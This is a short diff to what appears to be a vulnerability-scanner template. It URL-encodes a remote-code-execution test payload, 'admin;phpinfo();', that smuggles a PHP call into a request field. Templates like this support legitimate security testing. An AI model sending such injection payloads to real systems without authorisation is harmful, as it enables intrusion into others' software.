@@ -20,7 +20,7 @@ requests:
         Connection: keep-alive
     payloads:
       rce:
-         - "admin;phpinfo();"
+         - "admin%3Bphpinfo%28%29%3B"
     attack: batteringram
 
     stop-at-first-match: true
